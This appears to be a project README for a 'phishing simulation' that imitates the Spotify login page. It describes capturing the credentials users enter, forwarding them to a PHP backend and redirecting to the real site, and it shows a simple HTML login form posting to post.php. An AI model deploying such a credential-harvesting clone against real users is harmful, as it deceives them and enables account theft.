# 🎣 **Spotify Phishing Simulation**

![Phishing GIF](https://media1.tenor.com/m/SRy6HR5ibvsAAAAd/phishing-phisher.gif)

## 📌 **Project Overview**  
This project demonstrates a **phishing attack** by creating a web application that mimics the **Spotify login page**. The interface captures user credentials and forwards them to the backend, then redirects to the real Spotify page.

---

## 🛠️ **Technologies Used**  
- **Frontend:** HTML, CSS, JavaScript  
- **Backend:** PHP  

---

## 📄 **Code**  

### HTML (index.html)
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spotify Login</title>
</head>
<body>
    <form action="post.php" method="POST">
        <h2>Login to Spotify</h2>
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
